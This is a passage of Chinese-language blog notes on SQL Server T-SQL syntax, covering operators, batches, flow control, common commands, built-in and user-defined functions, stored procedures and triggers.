title="三、运算符"></a>三、运算符</h2><blockquote><p>算术运算符：<code>+、-、*、/、%</code></p><p>赋值运算符：<code>=</code></p><p>字符串连接运算符：<code>&quot;This is :&quot; + &quot; apple.&quot; = &quot;This is : apple.&quot;</code></p><p>比较运算符：<code>=、&gt;、&lt;、&gt;=、&lt;=、&lt;&gt;（不等于）</code>）    （后面为非SQL-92标准）<code>!=、!&lt;、!&gt;</code></p><p>逻辑运算符：<code>all and any between exists in like not or some</code>（一系列操作数中有些值为true结果为true）</p><p>按位运算符：<code>&amp;、|、^</code></p><p>一元运算符：<code>+、-（ 正号负号）、~（取反）</code></p></blockquote><p><img src="/posts/a0eceee2/运算符优先级.jpg" alt="img"></p><hr><h2 id="四、批处理"><a href="#四、批处理" class="headerlink" title="四、批处理"></a>四、批处理</h2><h3 id="1-go语句"><a href="#1-go语句" class="headerlink" title="1 go语句"></a>1 go语句</h3><blockquote><p><a href="https://www.cnblogs.com/Ting-light/p/9541279.html">语句</a></p><p>特点：一个批处理内的所有语句要么放在一起通过解析，要么没有一句能执行。</p><p>SQL Server中go语句使用注意事项：</p><ol><li>GO 命令和 Transact-SQL 语句不能在同一行中.但在 GO 命令行中可包含注释。</li><li>用户必须遵照使用批处理的规则.例如,在同一批处理中,创建数据库之后不能直接使用其新建的数据库。</li><li>局部（用户定义）变量的作用域限制在一个批处理中,不可在 GO 命令后引用。</li><li>每个被GO分隔的语句都是一个单独的事务，一个语句执行失败不会影响其它语句执行。</li><li>GO [count] count 为正整数.指定GO 之前的批处理执行指定的次数。</li></ol><p>语法：</p><p><code>​statement</code></p><p><code>​go</code></p></blockquote><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database [Roc]</span><br><span class="line">GO</span><br><span class="line">use [Roc]</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><hr><h2 id="五、流程控制语句"><a href="#五、流程控制语句" class="headerlink" title="五、流程控制语句"></a>五、流程控制语句</h2><h3 id="1-begin…end"><a href="#1-begin…end" class="headerlink" title="1 begin…end"></a>1 begin…end</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 用途：begin...end用来设定一个程序块，将在begin...end中的所有程序视为一个单元执行。</span><br></pre></td></tr></table></figure><h3 id="2-if…else"><a href="#2-if…else" class="headerlink" title="2 if…else"></a>2 if…else</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if <span class="operator">&lt;</span>exp<span class="operator">&gt;</span>  </span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> </span><br><span class="line">[<span class="keyword">else</span> if <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br></pre></td></tr></table></figure><h3 id="3-if-not-exists"><a href="#3-if-not-exists" class="headerlink" title="3 if [not] exists"></a>3 if [not] exists</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if [<span class="keyword">not</span>] <span class="keyword">exists</span> (<span class="keyword">select</span> 子查询)</span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> </span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br><span class="line"># if <span class="keyword">exists</span> 语句用于检测数据是否存在</span><br></pre></td></tr></table></figure><h3 id="4-case"><a href="#4-case" class="headerlink" title="4 case"></a>4 case</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 用法<span class="number">1</span>：</span><br><span class="line"><span class="keyword">case</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    [ <span class="keyword">else</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> ]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 该语句是将<span class="keyword">case</span>后面表达式与<span class="keyword">when</span>子句中的表达式的值进行比较，如果相等返回<span class="keyword">then</span>并跳出<span class="keyword">case</span>。当<span class="keyword">case</span>中没有<span class="keyword">else</span>时全部失败返回<span class="keyword">null</span>。</span><br><span class="line"></span><br><span class="line"># 用法<span class="number">2</span>：</span><br><span class="line"><span class="keyword">case</span></span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    ... </span><br><span class="line">   <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">   [ <span class="keyword">else</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> ]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 该语句是若<span class="keyword">when</span>为真则返回<span class="keyword">then</span>并跳出<span class="keyword">case</span>。当<span class="keyword">case</span>中没有<span class="keyword">else</span>时全部失败返回<span class="keyword">null</span>。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">case</span>命令可以嵌套到<span class="keyword">SQL</span>命令中</span><br><span class="line">sex<span class="operator">=</span></span><br><span class="line"><span class="keyword">case</span> ... <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="5-while…continue…break"><a href="#5-while…continue…break" class="headerlink" title="5 while…continue…break"></a>5 while…continue…break</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">while <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="operator">&lt;</span>statement<span class="operator">&gt;</span></span><br><span class="line">    [ break ]</span><br><span class="line">    [ continue ]</span><br><span class="line">    [statement]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="6-waitfor"><a href="#6-waitfor" class="headerlink" title="6 waitfor"></a>6 waitfor</h3><h3 id="7-goto"><a href="#7-goto" class="headerlink" title="7 goto"></a>7 goto</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 相当于jmp，先设定标识符，再jmp至标识符处</span><br><span class="line">goto 标识符</span><br></pre></td></tr></table></figure><h3 id="8-return"><a href="#8-return" class="headerlink" title="8 return"></a>8 return</h3><blockquote><p><code>return ([整数值])</code></p><p>RETURN语句用于无条件地终止一个查询、存储过程或者批处理，此时位于RETURN语句之后的程序将不会被执行。</p><p>return 不指定返回 0</p><p>return 不能返回null</p><p>return语句返回值</p></blockquote><p><img src="/posts/a0eceee2/return值.jpg" alt="img"></p><hr><h2 id="六、常用命令"><a href="#六、常用命令" class="headerlink" title="六、常用命令"></a>六、常用命令</h2><h3 id="1-backup"><a href="#1-backup" class="headerlink" title="1 backup"></a>1 backup</h3><blockquote><p>用处：备份。</p></blockquote><h3 id="2-restore"><a href="#2-restore" class="headerlink" title="2 restore"></a>2 restore</h3><blockquote><p>用处：备份。</p></blockquote><h3 id="3-checkpoint"><a href="#3-checkpoint" class="headerlink" title="3 checkpoint"></a>3 checkpoint</h3><blockquote><p>用处：将当前工作的数据库中被更改过的数据页或日志页从数据缓冲区中强制写入硬盘。</p><p>用法：<code>checkpoint [ checkpoint_duration ]</code></p><p>参数为int且必须大于0，单位为秒，表示SQL Server数据库引擎会在请求的持续时间内尝试执行检查点。</p><p>省略则SQL Server数据库引擎会自动调整检查点时间。</p></blockquote><h3 id="4-DBCC"><a href="#4-DBCC" class="headerlink" title="4 DBCC"></a>4 DBCC</h3><blockquote><p>用处：验证数据库完整性，查找错误，分析系统使用等等。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbcc 子命令</span><br><span class="line">decc help ( <span class="string">&#x27;?&#x27;</span> ) # 可以查询DBCC使用的所有命令。</span><br><span class="line">dbcc help ( <span class="string">&#x27;子命令&#x27;</span> ) # 可以查指定命令的用法。</span><br></pre></td></tr></table></figure><h3 id="5-declare"><a href="#5-declare" class="headerlink" title="5 declare"></a>5 declare</h3><blockquote><p>用处：声明局部变量，游标变量，表变量。</p><p><a href="https://www.cnblogs.com/xcj26/archive/2012/05/31/2528840.html">定义表</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> &#123;&#123; @ lcoal_variable data_type &#125;</span><br><span class="line"><span class="operator">|</span> &#123; @ cursor_variable_name <span class="keyword">CURSOR</span> &#125;</span><br><span class="line"><span class="operator">|</span> &#123; table_type_definition &#125;</span><br><span class="line">&#125; [ , ... n ]</span><br><span class="line"># 不能声明 text，ntext，image类型。</span><br><span class="line"></span><br><span class="line"># 表定义：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@order</span> <span class="keyword">table</span>(ID <span class="type">int</span>,Name <span class="type">varchar</span>(<span class="number">20</span>))</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@Detail</span> <span class="keyword">table</span>(ID <span class="type">int</span>,Price <span class="type">float</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="variable">@order</span>(ID,Name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;aa&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;bb&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;cc&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="variable">@Detail</span>(ID,Price) <span class="keyword">values</span>(<span class="number">1</span>,<span class="number">10.5</span>),(<span class="number">2</span>,<span class="number">12.3</span>),(<span class="number">4</span>,<span class="number">5.9</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="variable">@order</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="variable">@Detail</span></span><br></pre></td></tr></table></figure><h3 id="6-execute"><a href="#6-execute" class="headerlink" title="6 execute"></a>6 execute</h3><blockquote><p>execute 或 exec 执行存储过程。</p></blockquote><h3 id="7-kill"><a href="#7-kill" class="headerlink" title="7 kill"></a>7 kill</h3><blockquote><p>kill 命令用于终止某一过程的执行。</p></blockquote><h3 id="8-print"><a href="#8-print" class="headerlink" title="8 print"></a>8 print</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">print <span class="string">&#x27;any ASCII text&#x27;</span> <span class="operator">|</span> @ local_variable <span class="operator">|</span> @@ <span class="keyword">FUNCTION</span> <span class="operator">|</span> string_expression</span><br><span class="line"></span><br><span class="line"># print可以用 <span class="string">&#x27; + &#x27;</span> 拼接多个变量输出在同一行。</span><br><span class="line">print <span class="variable">@x</span> <span class="operator">+</span> <span class="variable">@y</span> </span><br></pre></td></tr></table></figure><h3 id="9-raiserror"><a href="#9-raiserror" class="headerlink" title="9 raiserror"></a>9 raiserror</h3><blockquote><p>用于在SQL Server系统返回错误信息时返回用户指定信息。</p></blockquote><h3 id="10-select"><a href="#10-select" class="headerlink" title="10 select"></a>10 select</h3><blockquote><p>用于变量赋值。</p></blockquote><p><code>select &#123; @local_variable = expression &#125; [ , ... n ]</code></p><h3 id="11-set"><a href="#11-set" class="headerlink" title="11 set"></a>11 set</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、局部变量赋值</span><br><span class="line"><span class="keyword">set</span> &#123; &#123; <span class="variable">@local_variable</span> <span class="operator">=</span> expression &#125; <span class="operator">|</span> &#123; <span class="variable">@cursor_variable</span> <span class="operator">=</span></span><br><span class="line">            &#123; <span class="variable">@cursor_variable1</span> cursor_name</span><br><span class="line">                   <span class="operator">|</span> &#123; <span class="keyword">cursor</span></span><br><span class="line">                   [ forward_only <span class="operator">|</span> <span class="keyword">scroll</span> ]</span><br><span class="line">                   [ <span class="keyword">static</span> <span class="operator">|</span> keyset <span class="operator">|</span> <span class="keyword">dynamic</span> <span class="operator">|</span> optimistic ]</span><br><span class="line">                   [ read_only <span class="operator">|</span> scroll_lcoks <span class="operator">|</span> optimistic ]</span><br><span class="line">                   [ type_warning ]</span><br><span class="line">                   <span class="keyword">for</span> select_statement</span><br><span class="line">                   [ <span class="keyword">for</span> &#123; read <span class="keyword">only</span></span><br><span class="line">                   <span class="operator">|</span> <span class="keyword">update</span> [ <span class="keyword">of</span> column_name [ , ... n ] &#125; ]            </span><br><span class="line">&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、用于用户执行<span class="keyword">SQL</span>命令时，<span class="keyword">SQL</span> Server处理选项的设定。</span><br><span class="line"><span class="keyword">SET</span>：<span class="keyword">ON</span></span><br><span class="line"><span class="keyword">SET</span>：OFF</span><br><span class="line"><span class="keyword">SET</span>：选项值</span><br></pre></td></tr></table></figure><h3 id="12-shutdown"><a href="#12-shutdown" class="headerlink" title="12 shutdown"></a>12 shutdown</h3><blockquote><p>停止SQL Server执行。</p><p><code>shutdown [ with nowait ]</code></p><p>带参数：立刻停止SQL Server，终止所有的用户过程并对每一个现行的事务发生一个回滚后退出SQL Server。</p><p>不带参数：</p><ol><li>阻止任何用户登入SQL Server。</li><li>等待尚未完成的Transact-SQL命令或存储过程执行完毕。</li><li>在每个数据库中执行checkpoint命令。</li><li>停止SQL Server执行。</li></ol></blockquote><h3 id="13-use"><a href="#13-use" class="headerlink" title="13 use"></a>13 use</h3><blockquote><p>用处：切换使用数据库。（需要有权限）</p><p><code>use &#123; database &#125;</code></p></blockquote><hr><h2 id="七、常用函数"><a href="#七、常用函数" class="headerlink" title="七、常用函数"></a>七、常用函数</h2><h3 id="1-统计"><a href="#1-统计" class="headerlink" title="1 统计"></a>1 统计</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 返回表达式中所有数据的标准差</span></span><br><span class="line"><span class="comment">-- 表达式中NULL会被忽略，数据类型为NUMERIC或类似的列，返回float类型</span></span><br><span class="line">stdev(exp)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回表达式中所有数据的总体标准差，其他同上</span></span><br><span class="line">stdevp(exp)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回表达式中所有数据的统计变异数。</span></span><br><span class="line">var(exp)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回表达式中所有数据的总体变异数。</span></span><br><span class="line">varp(exp)</span><br></pre></td></tr></table></figure><h3 id="2-算术-redirectedfrom-MSDN"><a href="#2-算术-redirectedfrom-MSDN" class="headerlink" title="2 算术?redirectedfrom=MSDN)"></a>2 <a href="https://learn.microsoft.com/zh-cn/previous-versions/sql/sql-server-2005/ms177516(v=sql.90">算术</a>?redirectedfrom=MSDN)</h3><h3 id="3-字符串"><a href="#3-字符串" class="headerlink" title="3 字符串"></a>3 字符串</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 字符串转换</span><br><span class="line"><span class="comment">-- ascii-&gt;int 输出</span></span><br><span class="line">ascii( character_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- int- &gt; ascii 输出</span></span><br><span class="line"><span class="type">char</span>( integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- str 全小写</span></span><br><span class="line"><span class="built_in">lower</span> ( integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- str 全大写</span></span><br><span class="line"><span class="built_in">upper</span> ( integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- int-&gt;str ()</span></span><br><span class="line"><span class="comment">-- length：返回字符串长度。</span></span><br><span class="line"><span class="comment">-- decimal：返回小数位数。</span></span><br><span class="line"><span class="comment">-- decimal大于length返回length个 *</span></span><br><span class="line">str( <span class="type">float</span>  _expression [ , length [ , <span class="operator">&lt;</span> <span class="type">decimal</span> <span class="operator">&gt;</span>]] )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 去空格函数</span><br><span class="line"><span class="comment">-- 去左空格</span></span><br><span class="line">ltrim ( character_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去右空格</span></span><br><span class="line">rtrim ( character_expression )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 取子串函数</span><br><span class="line"><span class="comment">-- 取最左边到第 integer_expression 个字符的部分</span></span><br><span class="line"><span class="keyword">left</span> ( character_expression , integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取最右边到第 integer_expression 个字符的部分</span></span><br><span class="line"><span class="keyword">right</span> ( character_expression , integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从第 starting_position 个位置取 length 个字符</span></span><br><span class="line"><span class="built_in">substring</span> ( expression , starting_position , length )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 字符串比较函数（两者区别：patindex子串中可以使用通配符，可以用于<span class="type">char</span>、<span class="type">varchar</span>、text数据类型）</span><br><span class="line"><span class="comment">-- 指定子串出现的开始位置。</span></span><br><span class="line"><span class="comment">-- substring_expression是要找的字符串</span></span><br><span class="line">charindex ( substring_expression , expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 指定子串出现的开始位置。</span></span><br><span class="line"><span class="comment">-- substring_expression是要找的字符串。（两端必须带%号）</span></span><br><span class="line">patindex ( <span class="string">&#x27; %substring_expression% &#x27;</span>  , expression )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 字符串操作函数</span><br><span class="line"><span class="comment">-- 用符号括起字符串</span></span><br><span class="line"><span class="comment">-- quote_ character 默认是&quot;[&quot; 。（用[]括起）</span></span><br><span class="line">quotename ( character_expression , [ , quote_ <span class="type">character</span> ] )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 重复字符串</span></span><br><span class="line">replicate ( character_expression , integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 逆转字符串</span></span><br><span class="line">reverse ( character_expression)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 替换字符串</span></span><br><span class="line"><span class="comment">-- 在 1 中找出 2 的子串，并用 3 替换 2 子串返回至 1 中</span></span><br><span class="line">replace ( string_expression1 ,string_expression2 , string_expression3 )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回一个空格字符串</span></span><br><span class="line">space( integer_expression )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将字符串中某处的一定长度的字符串替换成目标字符串。</span></span><br><span class="line"><span class="comment">-- character_expression2：目标字符串</span></span><br><span class="line">stuff( character_expression1 , start_position , length , character_expression2 )</span><br></pre></td></tr></table></figure><h3 id="4-数据类型转化"><a href="#4-数据类型转化" class="headerlink" title="4 数据类型转化"></a>4 数据类型转化</h3><blockquote><p>convert：<a href="https://www.cnblogs.com/tony312ws/archive/2011/08/04/2127225.html">时间转化</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 类型转化</span></span><br><span class="line"><span class="built_in">cast</span> ( <span class="operator">&lt;</span> expression <span class="operator">&gt;</span> <span class="keyword">as</span> <span class="operator">&lt;</span> data_type <span class="operator">&gt;</span> [ length ])</span><br></pre></td></tr></table></figure><h3 id="5-日期-链接"><a href="#5-日期-链接" class="headerlink" title="5 日期    链接"></a>5 日期    <a href="https://www.cnblogs.com/shanzhiming/p/15491641.html#25-yearmonth和day">链接</a></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 返回日期</span></span><br><span class="line"><span class="keyword">day</span> ( <span class="operator">&lt;</span> data_expression <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回月份</span></span><br><span class="line"><span class="keyword">month</span> ( <span class="operator">&lt;</span> data_expression <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回年</span></span><br><span class="line"><span class="keyword">year</span> ( <span class="operator">&lt;</span> data_expression <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 日期增加</span></span><br><span class="line"><span class="comment">-- &lt;datepart&gt;：YY | M | D | WK | HH</span></span><br><span class="line">dateadd ( <span class="operator">&lt;</span> datepart <span class="operator">&gt;</span> , <span class="operator">&lt;</span> number <span class="operator">&gt;</span> , <span class="operator">&lt;</span> <span class="type">date</span> <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 日期差值</span></span><br><span class="line">datediff ( <span class="operator">&lt;</span> datepart <span class="operator">&gt;</span> , <span class="operator">&lt;</span> date1 <span class="operator">&gt;</span> , <span class="operator">&lt;</span> date2 <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符串形式返回日期</span></span><br><span class="line">datename ( <span class="operator">&lt;</span> datepart <span class="operator">&gt;</span> , <span class="operator">&lt;</span> <span class="type">date</span> <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 整数形式返回日期</span></span><br><span class="line">datepart ( <span class="operator">&lt;</span> datepart <span class="operator">&gt;</span> , <span class="operator">&lt;</span> <span class="type">date</span> <span class="operator">&gt;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得当前日期和时间 datetime</span></span><br><span class="line">getdate()</span><br></pre></td></tr></table></figure><h3 id="6-自定义"><a href="#6-自定义" class="headerlink" title="6 自定义"></a>6 自定义</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/128744140">自定义函数</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> function_name</span><br><span class="line">( [ &#123; <span class="variable">@parameter_name</span> [ <span class="keyword">as</span> ] parameter_data_type  [ <span class="operator">=</span> <span class="keyword">default</span> ] [ readonly ]</span><br><span class="line">[ , ... n ]</span><br><span class="line">]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">returns</span> return_data_type</span><br><span class="line">[ <span class="keyword">with</span> encryption ]</span><br><span class="line">[ <span class="keyword">as</span> ]</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">function_body</span><br><span class="line"><span class="keyword">return</span> scalar_expression</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">-- function_name：函数名，同MySQL内置函数一样，大小写不敏感。</span></span><br><span class="line"><span class="comment">-- @parameter_name:：参数名，必须@ 开头，可以定义多个参数，逗号隔开。</span></span><br><span class="line"><span class="comment">-- parameter_data_type：参数类型。</span></span><br><span class="line"><span class="comment">-- [ = default ] ：默认值。</span></span><br><span class="line"><span class="comment">-- [ readonly ]：函数只读。</span></span><br><span class="line"><span class="comment">-- return_data_type：返回值类型。</span></span><br><span class="line"><span class="comment">-- with encryption：加密。任何人无法查看函数的定义。</span></span><br><span class="line"><span class="comment">-- begin...end：函数体。</span></span><br></pre></td></tr></table></figure><hr><h2 id="八、存储过程"><a href="#八、存储过程" class="headerlink" title="八、存储过程"></a>八、存储过程</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建"><a href="#2-创建" class="headerlink" title="2 创建"></a>2 创建</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> procedure_name [ ; number ]     <span class="comment">-- number：用于区分同名存储过程</span></span><br><span class="line">[ ( <span class="variable">@parameter</span> data_type &#125;</span><br><span class="line">[ <span class="type">varying</span> ] [ <span class="operator">=</span> <span class="keyword">default</span> ] [ output ]           <span class="comment">-- varying output 游标 default 默认值 output 返回参数</span></span><br><span class="line">] &#123; , ... n &#125;</span><br><span class="line">[ <span class="keyword">with</span></span><br><span class="line">    &#123; recompile <span class="operator">|</span> encryption <span class="operator">|</span> recompile , encryption &#125; ]  <span class="comment">-- 每次都重新编译 | 加密</span></span><br><span class="line">[ <span class="keyword">for</span> replication ]   <span class="comment">-- 没用</span></span><br><span class="line"><span class="keyword">as</span> sql_statement [ , ... n ]</span><br></pre></td></tr></table></figure><h3 id="3-查看"><a href="#3-查看" class="headerlink" title="3 查看"></a>3 查看</h3><blockquote><p><code>exec sp_helptext procedure_name</code></p></blockquote><h3 id="4-重命名"><a href="#4-重命名" class="headerlink" title="4 重命名"></a>4 重命名</h3><blockquote><p>右键。</p></blockquote><h3 id="5-删除"><a href="#5-删除" class="headerlink" title="5 删除"></a>5 删除</h3><blockquote><p><code>drop procedure procedure_name</code></p></blockquote><h3 id="6-执行"><a href="#6-执行" class="headerlink" title="6 执行"></a>6 执行</h3><blockquote><p><code>exec procedure procedure_name</code></p></blockquote><h3 id="7-修改"><a href="#7-修改" class="headerlink" title="7 修改"></a>7 修改</h3><blockquote><p>其他同理create。</p><p><code>alter procedure procedure_name</code></p></blockquote><h3 id="8-特殊存储过程"><a href="#8-特殊存储过程" class="headerlink" title="8 特殊存储过程"></a>8 特殊存储过程</h3><blockquote><p><code>sp_executesql</code>：可以执行sql语句</p><p><code>exec sp_executesql @sql , @para , [ @para1 = @para1 , ... ]</code>（SQL语句，SQL语句参数，参数值等于）</p></blockquote><hr><h2 id="九、触发器"><a href="#九、触发器" class="headerlink" title="九、触发器"></a>九、触发器</h2><h3 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建-1"><a href="#2-创建-1" class="headerlink" title="2 创建"></a>2 创建</h3><p>创建DML触发器</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 数据触发器</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> trigger_name </span><br><span class="line"><span class="keyword">ON</span> table_name</span><br><span class="line">[<span class="keyword">with</span> encryption]  </span><br><span class="line"><span class="keyword">for</span> <span class="operator">|</span> after <span class="operator">|</span> instead <span class="keyword">of</span></span><br><span class="line">[ <span class="keyword">delete</span> <span class="operator">|</span> <span class="keyword">update</span> <span class="operator">|</span> <span class="keyword">insert</span> ] </span><br><span class="line"><span class="keyword">as</span> sql_statement [ ; ]</span><br><span class="line"></span><br><span class="line"># <span class="keyword">rollback</span> transaction 回退数据库</span><br></pre></td></tr></table></figure><p>创建DDL触发器</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 结构触发器</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> trigger_name</span><br><span class="line"><span class="keyword">on</span> &#123; <span class="keyword">all</span> server <span class="operator">|</span> database &#125;</span><br><span class="line">[ <span class="keyword">with</span> encryption ]</span><br><span class="line">&#123; <span class="keyword">for</span> <span class="operator">|</span> after &#125; &#123; event_type <span class="operator">|</span> event_group &#125; [ , ... n ]</span><br><span class="line"><span class="keyword">as</span> sql_statement [ ; ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#123; all server | database &#125; ：作用于服务器 | 数据库</span></span><br><span class="line"><span class="comment">-- event_type：create_table , drop_table , alter_table</span></span><br><span class="line"><span class="comment">-- event_group：作用组</span></span><br><span class="line"><span class="comment">-- rollback 回退</span></span><br></pre></td></tr></table></figure><h3 id="3-查看-1"><a href="#3-查看-1" class="headerlink" title="3 查看"></a>3 查看</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 类型</span></span><br><span class="line"><span class="keyword">exec</span> sp_helptrigger <span class="string">&#x27; table &#x27;</span> [ , <span class="string">&#x27;type&#x27;</span> ]</span><br><span class="line"><span class="comment">-- 文本</span></span><br><span class="line"><span class="keyword">exec</span> sp_helptext <span class="string">&#x27;trigger_name&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-修改"><a href="#4-修改" class="headerlink" title="4 修改"></a>4 修改</h3><blockquote><p>同理create。</p><p><code>alter trigger trigger_name</code></p></blockquote><h3 id="5-使有效"><a href="#5-使有效" class="headerlink" title="5 使有效"></a>5 使有效</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">disable <span class="operator">|</span> enable <span class="keyword">trigger</span> &#123; [ schema . ] trigger_name [ , ... n ] <span class="operator">|</span> <span class="keyword">all</span> &#125;</span><br><span class="line"><span class="keyword">on</span> object_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- schema. ：架构</span></span><br><span class="line"><span class="comment">-- object_name：在其上创建DML触发器的对象名称</span></span><br></pre></td></tr></table></figure><h3 id="6-删除"><a href="#6-删除" class="headerlink" title="6 删除"></a>6 删除</h3><blockquote><p><code>drop trigger trigger_name</code></p></blockquote><hr><h2 id="十、备份和还原"><a href="#十、备份和还原" class="headerlink" title="十、备份和还原"></a>十、备份和还原</h2><h3 id="1-定义-2"><a href="#1-定义-2" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建备份"><a href="#2-创建备份" class="headerlink" title="2 创建备份"></a>2 创建备份</h3><h3 id="3-还原数据库"><a href="#3-还原数据库" class="headerlink" title="3 还原数据库"></a>3 还原数据库</h3>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库理论</title>
      <link href="/posts/d4ae3e2e.html"/>
      <url>/posts/d4ae3e2e.html</url>
      
